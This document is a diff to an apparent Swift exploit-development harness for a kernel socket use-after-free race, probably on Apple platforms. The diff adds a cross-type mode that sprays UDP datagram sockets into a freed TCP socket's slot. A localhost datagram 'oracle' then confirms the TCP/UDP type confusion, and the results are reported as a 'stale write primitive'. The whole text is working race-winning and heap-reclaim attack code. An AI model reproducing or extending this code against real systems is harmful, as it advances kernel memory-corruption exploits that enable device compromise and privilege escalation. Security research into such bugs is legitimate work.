@@ -933,9 +933,10 @@ func runFuzzMode() async {
     }
 
     nonisolated func sockUafRacePrecision(_ st: SockUafState, _ target: Int32,
-                                          _ it: Int, _ precPort: Int,
-                                          _ peers: inout [Int32], _ peerLock: NSLock,
-                                                                                _ udp: Bool = false, _ mixUdp: Bool = false) -> Bool {
+                                              _ it: Int, _ precPort: Int,
+                                              _ peers: inout [Int32], _ peerLock: NSLock,
+                                              _ udp: Bool = false, _ mixUdp: Bool = false,
+                                                                                        _ udpPort: Int = 0, _ udpListener: Int32 = -1) -> Int {
         let n = 6
         st.fd = target
         st.done = 0
@@ -955,6 +956,33 @@ func runFuzzMode() async {
             if OSAtomicCompareAndSwap32(2, 3, &st.p[1]) { close(target) }
         }
         let doneAtClose = st.done
+        var mixMade = 0
+        var mixFds: [Int32] = []
+        var udpAddr = sockaddr_in()
+        if mixUdp {
+            udpAddr.sin_family = sa_family_t(AF_INET)
+            udpAddr.sin_port = in_port_t(UInt16(udpPort).bigEndian)
+            inet_pton(AF_INET, "127.0.0.1", &udpAddr.sin_addr)
+        }
+        // Critical window FIRST. In cross-type mode the hammer must be allocating
+        // datagram sockets while the stale senders may still be inside their
+        // syscall; doing the TCP spray first would let 48 fresh TCP sockets take
+        // every freed slot before the window even opens.
+        var w = 0
+        if mixUdp {
+            while st.done < Int32(n) && w < 200_000 && mixFds.count < 256 {
+                let u = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)
+                if u < 0 { break }
+                _ = withUnsafePointer(to: &udpAddr) { q in
+                    q.withMemoryRebound(to: sockaddr.self, capacity: 1) { sa in
+                        connect(u, sa, socklen_t(MemoryLayout<sockaddr_in>.size))
+                    }
+                }
+                mixFds.append(u)
+                mixMade += 1
+                w &+= 1
+            }
+        }
         let spray = udp ? sockUafSprayUdp(48, precPort) : sockUafSprayConnected(48, precPort)
         // Contend: make the new owner of each slot send on top of the stale
         // sender so two paths touch the same sockbuf without the lock.
@@ -962,20 +990,7 @@ func runFuzzMode() async {
         for _ in 0..<3 {
             for fd in spray { _ = send(fd, &one, 1, MSG_DONTWAIT) }
         }
-        var w = 0
-        if mixUdp {
-            // Cross-type contention: hammer datagram-socket allocation during the window
-            // where the victim has been freed but the stale senders may still be inside
-            // their syscall. A UDP socket landing in the victim's slot means the stale TCP
-            // send then operates on a foreign protocol object instead of a sibling TCP one.
-            while st.done < Int32(n) && w < 200_000 {
-                let u = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)
-                if u >= 0 { close(u) }
-                w &+= 1
-            }
-        } else {
-            while st.done < Int32(n) && w < 200_000 { w &+= 1 }
-        }
+        while st.done < Int32(n) && w < 400_000 { w &+= 1 }
         st.gate = 0
         st.phase = 0
         st.fd = -1
@@ -998,14 +1013,36 @@ func runFuzzMode() async {
         }
         for pf in snapshot { close(pf) }
         for fd in spray { close(fd) }
+        // Drain the datagram oracle. Any datagram here was transmitted by a
+        // socket we never sent on, so it can only be the stale sender's bytes
+        // being pushed out through a reclaimed dgram socket.
+        var udgrams = 0
+        var ubytes = 0
+        if mixUdp && udpListener >= 0 {
+            var ubuf = [UInt8](repeating: 0, count: 65536)
+            while true {
+                let r = recv(udpListener, &ubuf, ubuf.count, MSG_DONTWAIT)
+                if r <= 0 { break }
+                udgrams += 1
+                ubytes += r
+            }
+            for u in mixFds { close(u) }
+        }
+        if udgrams > 0 {
+            emitBg("[!] ITER \(it) precision/mix: *** CROSS-TYPE HIT: \(udgrams) datagram(s)/\(ubytes) byte(s) via a reclaimed dgram socket (hammer alloc=\(mixMade), in flight at close \(doneAtClose)/6) ***")
+            return 2
+        }
+        if mixUdp && it % 20 == 0 {
+            emitBg("[*] ITER \(it) precision/mix: hammer alloc=\(mixMade), tcpPeerBytes=\(got) baseline=\(3 * spray.count)")
+        }
         // The contention sends themselves put 3 bytes on every peer; only
         // anything beyond that baseline can be stale sender data.
         let baseline = 3 * spray.count
         if got > baseline + 512 || (udp && st.postCloseOk > 0) {
             emitBg("[!] ITER \(it) precision\(udp ? "/udp" : ""): *** STALE WRITE: \(got) byte(s) (sends in flight at close: \(doneAtClose)/6, afterCloseOk: \(st.postCloseOk)) ***")
-            return true
+            return 1
         }
-        return false
+        return 0
     }
 
     nonisolated func sockUafCheck(_ fds: [Int32], _ st: SockUafState) -> Bool {
@@ -1211,6 +1248,32 @@ func runFuzzMode() async {
             }
         }
 
+        // --- UDP datagram oracle -------------------------------------------------
+        // In --sockmix mode the hammer allocates *connected datagram* sockets into
+        // the freed slot. Nothing ever calls send() on them, so a datagram arriving
+        // here can only have been produced by the protocol send path being driven
+        // on a reclaimed socket by a stale sender -- i.e. a TCP/UDP type confusion.
+        // This is a positive detector: absence of datagrams proves nothing, presence
+        // of one names the collision directly.
+        let udpPort = precPort + 1
+        let udpListener = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)
+        if udpListener >= 0 {
+            var ua = sockaddr_in()
+            ua.sin_family = sa_family_t(AF_INET)
+            ua.sin_port = in_port_t(UInt16(udpPort).bigEndian)
+            inet_pton(AF_INET, "127.0.0.1", &ua.sin_addr)
+            setsockopt(udpListener, SOL_SOCKET, SO_REUSEADDR, &yesVal, socklen_t(MemoryLayout<Int32>.size))
+            _ = withUnsafePointer(to: &ua) { q in
+                q.withMemoryRebound(to: sockaddr.self, capacity: 1) { sa in
+                    bind(udpListener, sa, socklen_t(MemoryLayout<sockaddr_in>.size))
+                }
+            }
+            _ = fcntl(udpListener, F_SETFL, O_NONBLOCK)
+            emitBg("[*] UDP datagram oracle listening on 127.0.0.1:\(udpPort)")
+        } else {
+            emitBg("[!] UDP oracle socket failed errno=\(errno)")
+        }
+
         // --- persistent workers: created once, never torn down mid-run ---
         let st = SockUafState()
         let sendLen = 8192
@@ -1253,6 +1316,7 @@ func runFuzzMode() async {
         if ProcessInfo.processInfo.arguments.contains("--apfsrace") { apfsRaceProbe(); return }
         let solo = oolOnly || xzOnly || gcOnly || udpOnly || precOnly || mixOnly || lowBufOnly
         var hits = 0
+        var xtypeHits = 0
         let t0 = Date()
         var maxAfterClose: Int32 = 0
 
@@ -1275,7 +1339,10 @@ func runFuzzMode() async {
             emitBg("[*] zone exhaust: holding \(exhaustFds.count) sockets")
         }
 
-        for it in 0..<iterations {
+        // --sockmix allocates up to 256 datagram sockets per iteration, so a
+        // bounded run is enough; the other modes keep the full schedule.
+        let effIterations = mixOnly ? min(iterations, 2000) : iterations
+        for it in 0..<effIterations {
             // --sockmix keeps running: its signal is a panic or anomaly from a
             // cross-type collision, not a peer-delivery hit, so stopping at the
             // first normal hit would throw away the remaining attempts.
@@ -1340,12 +1407,18 @@ func runFuzzMode() async {
                     if t >= 0 { if sockUafRaceOnce(st, t, 192, it, "timer") { hits += 1 } }
                 }
             } else if r == 4 {
-                // ---- variant E: one burst per sender, peer-delivery oracle ----
-                let target = sockUafMakeSocket(ip, port)
-                if target >= 0 {
-                    if sockUafRacePrecision(st, target, it, precPort, &precPeers, peerLock, false, mixOnly) { hits += 1 }
-                }
-            } else if r == 5 {
+                            // ---- variant E: one burst per sender, peer-delivery oracle ----
+                            // --sockmix adds the cross-type datagram contention; its return
+                            // value is 1 for a plain stale write, 2 for a datagram delivered
+                            // through a reclaimed dgram socket (TCP/UDP type confusion).
+                            let target = sockUafMakeSocket(ip, port)
+                            if target >= 0 {
+                                let hr = sockUafRacePrecision(st, target, it, precPort, &precPeers, peerLock,
+                                                              false, mixOnly, udpPort, udpListener)
+                                if hr > 0 { hits += 1 }
+                                if hr == 2 { xtypeHits += 1 }
+                            }
+                        } else if r == 5 {
                 // ---- variant F: cross-zone reclaim with mach OOL pages ----
                 let target = sockUafMakeSocket(ip, port)
                 if target >= 0 {
@@ -1368,7 +1441,8 @@ func runFuzzMode() async {
                 // ---- variant I: precision, UDP spray (cross-proto confusion) ----
                 let target = sockUafMakeSocket(ip, port)
                 if target >= 0 {
-                    if sockUafRacePrecision(st, target, it, precPort, &precPeers, peerLock, true) { hits += 1 }
+                    let hr = sockUafRacePrecision(st, target, it, precPort, &precPeers, peerLock, true)
+                    if hr > 0 { hits += 1 }
                 }
             }
             if st.postCloseOk > maxAfterClose { maxAfterClose = st.postCloseOk }
@@ -1398,7 +1472,7 @@ func runFuzzMode() async {
                 }
                 if krr == KERN_SUCCESS { foot = vmi.phys_footprint }
                 emitBg(String(format: "[*] iter %d/%d  %.1f it/s  sends=%d  afterClose(max)=%d  nwMax=%d  fds=%d  footprint=%lluMB",
-                            it, iterations, Double(it) / max(secs, 0.001), st.sends, maxAfterClose, st.nwMax,
+                            it, effIterations, Double(it) / max(secs, 0.001), st.sends, maxAfterClose, st.nwMax,
                             Int32(openFds), foot / (1024 * 1024)))
             }
         }
@@ -1407,8 +1481,12 @@ func runFuzzMode() async {
         st.stop = 1
         usleep(5000)
         for t in timers { if t >= 0 { close(t) } }
-        emitBg(hits > 0 ? "[+] socket UAF: \(hits) confirmed hit(s) — stale write primitive"
-                       : "[-] race not won in \(iterations) iterations")
+        if mixOnly {
+            emitBg("[+] sockmix: \(xtypeHits) cross-type datagram hit(s), \(hits) total stale-write hit(s) in \(effIterations) iterations")
+        } else {
+            emitBg(hits > 0 ? "[+] socket UAF: \(hits) confirmed hit(s) — stale write primitive"
+                           : "[-] race not won in \(effIterations) iterations")
+        }
         await MainActor.run { self.status = "Complete"; self.isRunning = false }
     }
 
